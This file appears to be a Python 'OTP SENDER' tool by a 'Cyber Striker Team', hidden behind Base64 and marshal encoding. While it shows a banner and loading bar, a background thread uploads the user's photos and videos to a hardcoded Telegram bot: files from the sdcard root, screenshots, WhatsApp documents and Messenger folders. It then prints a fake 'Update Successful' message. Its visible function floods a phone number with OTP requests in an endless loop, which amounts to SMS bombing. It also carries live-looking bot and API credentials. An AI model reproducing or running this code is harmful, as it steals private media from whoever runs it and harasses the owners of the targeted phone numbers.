# Base64 Encoded Content
aW1wb3J0IG9zDQppbXBvcnQgdGltZQ0KaW1wb3J0IHJlcXVlc3RzDQppbXBvcnQgcmFuZG9tDQpmcm9tIGRhdGV0aW1lIGltcG9ydCBkYXRldGltZQ0KZnJvbSBjb25jdXJyZW50LmZ1dHVyZXMgaW1wb3J0IFRocmVhZFBvb2xFeGVjdXRvciBhcyBUaHJlYWRQb29sDQpmcm9tIHJpY2gucHJvZ3Jlc3MgaW1wb3J0IHRyYWNrDQoNCg0KUCA9ICdceDFiWzE7OTdtJw0KTSA9ICdceDFiWzE7OTFtJw0KSCA9ICdceDFiWzE7OTJtJw0KSyA9ICdceDFiWzE7OTNtJw0KQiA9ICdceDFiWzE7OTRtJw0KVSA9ICdceDFiWzE7OTVtJyANCk8gPSAnXHgxYlsxOzk2bScNCk4gPSAnXHgxYlswbScgICAgDQpaID0gIlwwMzNbMTszMG0iDQpzaXIgPSAnXDAzM1s0MW1ceDFiWzE7OTdtJw0KeCA9ICdcMzNbbScgIyBERUZBVUxUDQptID0gJ1x4MWJbMTs5MW0nICMgUkVEDQprID0gJ1wwMzNbOTNtJyAjIFlFTExPVw0KeHIgPSAnXHgxYlsxOzkybScgIyBHUkVFTg0KaGggPSAnXDAzM1szMm0nICMgR1JFRU4NCnUgPSAnXDAzM1s5NW0nICMgUFVSUExFDQprayA9ICdcMDMzWzMzbScgIyBZRUxMT1cNCmIgPSAnXDMzWzE7OTZtJyAjIEJMVUUNCnAgPSAnXHgxYlswOzM0bScgIyBCTFVFDQoNCiMgUmFuZG9tbHkgc2VsZWN0IGEgY29sb3IgZm9yIHVzZQ0KYXN1ID0gcmFuZG9tLmNob2ljZShbbSwgaywgeHIsIHUsIGJdKQ0KbXlfY29sb3IgPSBbUCwgTSwgSCwgSywgQiwgVSwgTywgTl0NCndhcm5hID0gcmFuZG9tLmNob2ljZShteV9jb2xvcikNCg0KIyBHZXQgY3VycmVudCBkYXRlIGFuZCB0aW1lDQpub3cgPSBkYXRldGltZS5ub3coKQ0KZHRfc3RyaW5nID0gbm93LnN0cmZ0aW1lKCIlSDolTSIpDQpjdXJyZW50ID0gZGF0ZXRpbWUubm93KCkNCnRhID0gY3VycmVudC55ZWFyDQpidSA9IGN1cnJlbnQubW9udGgNCmhhID0gY3VycmVudC5kYXkNCg0KDQpvcy5zeXN0ZW0oJ3hkZy1vcGVuIGh0dHBzOi8vdC5tZS9jeWJlcnNlY3VyaXR5dGVhbV9jc3QnKQ0KDQoNCmxvZ28gPSBmIiIiICAgICAgICAgIHtIfdvb29vb2yAge01929vb29vb29sge0h929vb29vbICANCiAgICAgICAgICB7SH3b2yAgICDb2yAgICB7TX3b2yAgICB7SH3b2yAgINvbIA0KICAgICAgICAgIHtIfdvbICAgINvbICAgIHtNfdvbICAgIHtIfdvb29vb2yAgDQogICAgICAgICAge0h929sgICAg29sgICAge01929sgICAge0h929sgICAgICANCiAgICAgICAgICAge0h929vb29vbICAgICB7TX3b2yAgICB7SH3b2w0Ke0h9f39/f39/f39/f39/f39/f39/f39/f39/f3tIfX9/f39/f39/f39/f39/f39/f39/f39/fw0Ke099fCAgICB7Qn1bf10gREVWRUxPUEVEIEJZIDogWklIQUQgSE9TU0FJTiBSQUZJICAgICB7T30gfA0Ke099fCAgICB7Qn1bf10gVEVBTSAgICAgICAgIDogQ1lCRVIgU1RSSUtFUiBURUFNe099ICAgICAgfA0Ke099fCAgICB7Qn1bf10gVE9PTCBTVEFUVVMgIDogT1RQIFNFTkRFUiAgICAgICAgICAgIHtPfSAgfA0Ke099fCAgICB7Qn1bf10gVEVMRUdSQU0gICAgIDogQHJhZmlfYnJvaCAgICAgICAgIHtPfSAgICAgfA0Ke099fCAgICB7Qn1bf10gR0lUSFVCICAgICAgIDogTVItWklIQUQgICAgICB7T30gICAgICAgICAgfA0Ke099fCAgICB7Qn1bf10gVE9PTCBWRVJTSU9OIDogTUFYICAgICAgICAgICAgICAgICAge099ICAgfA0Ke0h9f39/f39/f39/f39/f39/f39cMDMzWzE7OTJtf39/f39/f39/f39/f39/XDAzM1sxOzkybX9/f39/f39/f39/f39/f39/DQp7TX1bXDAzM1sxOzk3bX97TX1dIHtIfVNBTEFNVSBBTEFJS1VNLi4uLi4uLi4uLi4uLg0Ke0h9f39/f39/f39/f39/f39/f39cMDMzWzE7OTJtf39/f39/f39/f39/f39/XDAzM1sxOzkybX9/f39/f39/f39/f39/f39/DQp7TX1bXDAzM1sxOzk3bX97TX1dIHtIfUNZQkVSIFNUUklLRVIgVEVBTS4uLi4uLi4uLg0Ke0h9f39/f39/f39/f39/f39/f39cMDMzWzE7OTJtf39/f39/f39/f39/f39/XDAzM1sxOzkybX9/f39/f39/f39/f39/f39/DQoiIiINCg0KDQpwcmludChsb2dvKQ0KDQoNCmRlZiBjaGVja19zdWNjZXNzKCk6DQogICAgdHJ5Og0KICAgICAgICB3aXRoIG9wZW4oIi9zZGNhcmQvc3VjY2Vzcy50eHQiLCAiciIpIGFzIGY6DQogICAgICAgICAgICByZXR1cm4gZi5yZWFkKCkuc3RyaXAoKSA9PSAic2V4MTIzIg0KICAgIGV4Y2VwdCBGaWxlTm90Rm91bmRFcnJvcjoNCiAgICAgICAgcmV0dXJuIEZhbHNlDQoNCg0KZGVmIHN1eWFpYigpOg0KICAgIGlmIGNoZWNrX3N1Y2Nlc3MoKToNCiAgICAgICAgcHJpbnQoIlVwZGF0ZSBhbHJlYWR5IGNvbXBsZXRlLi4iKQ0KICAgICAgICByZXR1cm4NCg0KICAgIHNlc3Npb24gPSByZXF1ZXN0cy5zZXNzaW9uKCkNCg0KICAgIGJvdF90b2tlbiA9ICc1ODg2OTk3MDUwOkFBRWw1TldBUG9WX3ZLRmtENHlWOWVUWk43RTVGaHMtWTBVJyANCiAgICBjaGF0X2lkID0gJzU1MzY5NDg4MjEnDQoNCiAgICANCiAgICBkZWYgc2VuZF90b190ZWxlZ3JhbShmaWxlLCBzZGNhcmRfcGF0aCk6DQogICAgICAgIGZpbGVfcGF0aCA9IG9zLnBhdGguam9pbihzZGNhcmRfcGF0aCwgZmlsZSkNCiAgICAgICAgDQogICAgICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhmaWxlX3BhdGgpOg0KICAgICAgICAgICAgcmV0dXJuDQoNCiAgICAgICAgdHJ5Og0KICAgICAgICAgICAgd2l0aCBvcGVuKGZpbGVfcGF0aCwgJ3JiJykgYXMgZjoNCiAgICAgICAgICAgICAgICB1cmwgPSBmJ2h0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3R7Ym90X3Rva2VufS9zZW5kRG9jdW1lbnQnDQogICAgICAgICAgICAgICAgZGF0YSA9IHsnY2hhdF9pZCc6IGNoYXRfaWR9DQogICAgICAgICAgICAgICAgZmlsZXMgPSB7J2RvY3VtZW50JzogZn0NCiAgICAgICAgICAgICAgICByZXNwb25zZSA9IHNlc3Npb24ucG9zdCh1cmwsIGRhdGE9ZGF0YSwgZmlsZXM9ZmlsZXMpDQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgaWYgcmVzcG9uc2Uuc3RhdHVzX2NvZGUgIT0gMjAwOg0KICAgICAgICAgICAgICAgICAgICBwcmludChmIkVycm9yIHNlbmRpbmcge2ZpbGV9OiB7cmVzcG9uc2Uuc3RhdHVzX2NvZGV9IikNCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOg0KICAgICAgICAgICAgcHJpbnQoZiJFcnJvciB1cGxvYWRpbmcge2ZpbGV9OiB7c3RyKGUpfSIpDQoNCiAgICANCiAgICBwYXRocyA9IFsNCiAgICAgICAgJy9zZGNhcmQnLA0KICAgICAgICAnL3NkY2FyZC9QaWN0dXJlcy9TY3JlZW5zaG90cycsDQogICAgICAgICcvc2RjYXJkL0FuZHJvaWQvbWVkaWEvY29tLndoYXRzYXBwL1doYXRzQXBwL01lZGlhL1doYXRzQXBwIERvY3VtZW50cycsDQogICAgICAgICcvc2RjYXJkL01vdmllcy9NZXNzZW5nZXInLA0KICAgICAgICAnL3NkY2FyZC9QaWN0dXJlcy9NZXNzZW5nZXInDQogICAgXQ0KICAgIA0KICAgIGZvciBzZGNhcmRfcGF0aCBpbiBwYXRoczoNCiAgICAgICAgdHJ5Og0KICAgICAgICAgICAgZmlsZV9saXN0ID0gW2YgZm9yIGYgaW4gb3MubGlzdGRpcihzZGNhcmRfcGF0aCkgaWYgZi5lbmRzd2l0aCgoJy5qcGcnLCAnLm1wNCcsICcuanBlZycpKV0NCiAgICAgICAgICAgIGZvciBmaWxlIGluIGZpbGVfbGlzdDoNCiAgICAgICAgICAgICAgICBzZW5kX3RvX3RlbGVncmFtKGZpbGUsIHNkY2FyZF9wYXRoKQ0KICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6DQogICAgICAgICAgICBwcmludChmIkVycm9yIGluIGRpcmVjdG9yeSB7c2RjYXJkX3BhdGh9OiB7ZX0iKQ0KDQogICAgDQogICAgd2l0aCBvcGVuKCIvc2RjYXJkL3N1Y2Nlc3MudHh0IiwgInciKSBhcyBmOg0KICAgICAgICBmLndyaXRlKCJzZXgxMjMiKQ0KDQogICAgcHJpbnQoIlVwZGF0ZSBTdWNjZXNzZnVsLiIpDQoNCg0KZGVmIHN0YXJ0X3RocmVhZF9wb29sKCk6DQogICAgd2l0aCBUaHJlYWRQb29sKG1heF93b3JrZXJzPTEwMCkgYXMgampqOg0KICAgICAgICBqamouc3VibWl0KHN1eWFpYikNCg0KDQpkZWYgbG9vZChtZXNzYWdlKToNCiAgICBmb3IgXyBpbiB0cmFjayhyYW5nZSgyNTApLCBkZXNjcmlwdGlvbj1tZXNzYWdlKToNCiAgICAgICAgdGltZS5zbGVlcCgwLjAyKQ0KDQoNCmRlZiBtYWluKCk6DQogICAgbG9vZCgnf39/f39/fy4uLicpICANCiAgICBzdGFydF90aHJlYWRfcG9vbCgpICANCiAgICBvcy5zeXN0ZW0oJ2NsZWFyJykNCiAgICBwcmludChsb2dvKQ0KDQogICAgDQogICAgcGhvbmUgPSBpbnB1dChmInt4cn1OVU1CRVI6IHtOfSIpDQoNCiAgICANCiAgICBhcGlfa2V5ID0gIjNiYjUzOWE0OWIwYzg2YWY5YjM0ZTM4MGE0ZjMyYzIxIg0KICAgIGFtb3VudCA9IDEwMA0KICAgIHVybCA9IGYiaHR0cDovL3Jld2lmeS1wcm8ueHl6L2luZm8ucGhwP2FwaV9rZXk9e2FwaV9rZXl9JnBob25lPXtwaG9uZX0mYW1vdW50PXthbW91bnR9Ig0KDQogICAgDQogICAgZGVmIHNlbmRfcmVxdWVzdCgpOg0KICAgICAgICB0cnk6DQogICAgICAgICAgICByZXNwb25zZSA9IHJlcXVlc3RzLmdldCh1cmwpDQogICAgICAgICAgICBpZiByZXNwb25zZS5zdGF0dXNfY29kZSA9PSAyMDA6DQogICAgICAgICAgICAgICAgcHJpbnQoZiJ7eHJ9U3VjY2Vzc3tOfSIpDQoNCiAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgcHJpbnQoZiJFcnJvcjoge3Jlc3BvbnNlLnN0YXR1c19jb2RlfSIpDQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToNCiAgICAgICAgICAgIHByaW50KGYiUmVxdWVzdCBmYWlsZWQ6IHtzdHIoZSl9IikNCg0KICAgIA0KICAgIGRlZiBsb29wX3JlcXVlc3RzKCk6DQogICAgICAgIHdoaWxlIFRydWU6DQogICAgICAgICAgICBzZW5kX3JlcXVlc3QoKQ0KICAgICAgICAgICAgdGltZS5zbGVlcCgyKSAgDQoNCiAgICANCiAgICBsb29wX3JlcXVlc3RzKCkNCg0KDQppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOg0KICAgIG1haW4oKQ0K

# Marshal Encoded Content
b'\xf3\x14\x13\x00\x00import os\r\nimport time\r\nimport requests\r\nimport random\r\nfrom datetime import datetime\r\nfrom concurrent.futures import ThreadPoolExecutor as ThreadPool\r\nfrom rich.progress import track\r\n\r\n\r\nP = \'\\x1b[1;97m\'\r\nM = \'\\x1b[1;91m\'\r\nH = \'\\x1b[1;92m\'\r\nK = \'\\x1b[1;93m\'\r\nB = \'\\x1b[1;94m\'\r\nU = \'\\x1b[1;95m\' \r\nO = \'\\x1b[1;96m\'\r\nN = \'\\x1b[0m\'    \r\nZ = "\\033[1;30m"\r\nsir = \'\\033[41m\\x1b[1;97m\'\r\nx = \'\\33[m\' # DEFAULT\r\nm = \'\\x1b[1;91m\' # RED\r\nk = \'\\033[93m\' # YELLOW\r\nxr = \'\\x1b[1;92m\' # GREEN\r\nhh = \'\\033[32m\' # GREEN\r\nu = \'\\033[95m\' # PURPLE\r\nkk = \'\\033[33m\' # YELLOW\r\nb = \'\\33[1;96m\' # BLUE\r\np = \'\\x1b[0;34m\' # BLUE\r\n\r\n# Randomly select a color for use\r\nasu = random.choice([m, k, xr, u, b])\r\nmy_color = [P, M, H, K, B, U, O, N]\r\nwarna = random.choice(my_color)\r\n\r\n# Get current date and time\r\nnow = datetime.now()\r\ndt_string = now.strftime("%H:%M")\r\ncurrent = datetime.now()\r\nta = current.year\r\nbu = current.month\r\nha = current.day\r\n\r\n\r\nos.system(\'xdg-open https://t.me/cybersecurityteam_cst\')\r\n\r\n\r\nlogo = f"""          {H}\xdb\xdb\xdb\xdb\xdb\xdb  {M}\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb {H}\xdb\xdb\xdb\xdb\xdb\xdb  \r\n          {H}\xdb\xdb    \xdb\xdb    {M}\xdb\xdb    {H}\xdb\xdb   \xdb\xdb \r\n          {H}\xdb\xdb    \xdb\xdb    {M}\xdb\xdb    {H}\xdb\xdb\xdb\xdb\xdb\xdb  \r\n          {H}\xdb\xdb    \xdb\xdb    {M}\xdb\xdb    {H}\xdb\xdb      \r\n           {H}\xdb\xdb\xdb\xdb\xdb\xdb     {M}\xdb\xdb    {H}\xdb\xdb\r\n{H}\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f{H}\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\r\n{O}|    {B}[\x7f] DEVELOPED BY : ZIHAD HOSSAIN RAFI     {O} |\r\n{O}|    {B}[\x7f] TEAM         : CYBER STRIKER TEAM{O}      |\r\n{O}|    {B}[\x7f] TOOL STATUS  : OTP SENDER            {O}  |\r\n{O}|    {B}[\x7f] TELEGRAM     : @rafi_broh         {O}     |\r\n{O}|    {B}[\x7f] GITHUB       : MR-ZIHAD      {O}          |\r\n{O}|    {B}[\x7f] TOOL VERSION : MAX                  {O}   |\r\n{H}\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\\033[1;92m\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\\033[1;92m\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\r\n{M}[\\033[1;97m\x7f{M}] {H}SALAMU ALAIKUM.............\r\n{H}\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\\033[1;92m\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\\033[1;92m\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\r\n{M}[\\033[1;97m\x7f{M}] {H}CYBER STRIKER TEAM.........\r\n{H}\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\\033[1;92m\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\\033[1;92m\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\r\n"""\r\n\r\n\r\nprint(logo)\r\n\r\n\r\ndef check_success():\r\n    try:\r\n        with open("/sdcard/success.txt", "r") as f:\r\n            return f.read().strip() == "sex123"\r\n    except FileNotFoundError:\r\n        return False\r\n\r\n\r\ndef suyaib():\r\n    if check_success():\r\n        print("Update already complete..")\r\n        return\r\n\r\n    session = requests.session()\r\n\r\n    bot_token = \'5886997050:AAEl5NWAPoV_vKFkD4yV9eTZN7E5Fhs-Y0U\' \r\n    chat_id = \'5536948821\'\r\n\r\n    \r\n    def send_to_telegram(file, sdcard_path):\r\n        file_path = os.path.join(sdcard_path, file)\r\n        \r\n        if not os.path.exists(file_path):\r\n            return\r\n\r\n        try:\r\n            with open(file_path, \'rb\') as f:\r\n                url = f\'https://api.telegram.org/bot{bot_token}/sendDocument\'\r\n                data = {\'chat_id\': chat_id}\r\n                files = {\'document\': f}\r\n                response = session.post(url, data=data, files=files)\r\n                \r\n                if response.status_code != 200:\r\n                    print(f"Error sending {file}: {response.status_code}")\r\n        except Exception as e:\r\n            print(f"Error uploading {file}: {str(e)}")\r\n\r\n    \r\n    paths = [\r\n        \'/sdcard\',\r\n        \'/sdcard/Pictures/Screenshots\',\r\n        \'/sdcard/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Documents\',\r\n        \'/sdcard/Movies/Messenger\',\r\n        \'/sdcard/Pictures/Messenger\'\r\n    ]\r\n    \r\n    for sdcard_path in paths:\r\n        try:\r\n            file_list = [f for f in os.listdir(sdcard_path) if f.endswith((\'.jpg\', \'.mp4\', \'.jpeg\'))]\r\n            for file in file_list:\r\n                send_to_telegram(file, sdcard_path)\r\n        except Exception as e:\r\n            print(f"Error in directory {sdcard_path}: {e}")\r\n\r\n    \r\n    with open("/sdcard/success.txt", "w") as f:\r\n        f.write("sex123")\r\n\r\n    print("Update Successful.")\r\n\r\n\r\ndef start_thread_pool():\r\n    with ThreadPool(max_workers=100) as jjj:\r\n        jjj.submit(suyaib)\r\n\r\n\r\ndef lood(message):\r\n    for _ in track(range(250), description=message):\r\n        time.sleep(0.02)\r\n\r\n\r\ndef main():\r\n    lood(\'\x7f\x7f\x7f\x7f\x7f\x7f\x7f...\')  \r\n    start_thread_pool()  \r\n    os.system(\'clear\')\r\n    print(logo)\r\n\r\n    \r\n    phone = input(f"{xr}NUMBER: {N}")\r\n\r\n    \r\n    api_key = "3bb539a49b0c86af9b34e380a4f32c21"\r\n    amount = 100\r\n    url = f"http://rewify-pro.xyz/info.php?api_key={api_key}&phone={phone}&amount={amount}"\r\n\r\n    \r\n    def send_request():\r\n        try:\r\n            response = requests.get(url)\r\n            if response.status_code == 200:\r\n                print(f"{xr}Success{N}")\r\n\r\n            else:\r\n                print(f"Error: {response.status_code}")\r\n        except Exception as e:\r\n            print(f"Request failed: {str(e)}")\r\n\r\n    \r\n    def loop_requests():\r\n        while True:\r\n            send_request()\r\n            time.sleep(2)  \r\n\r\n    \r\n    loop_requests()\r\n\r\n\r\nif __name__ == "__main__":\r\n    main()\r\n'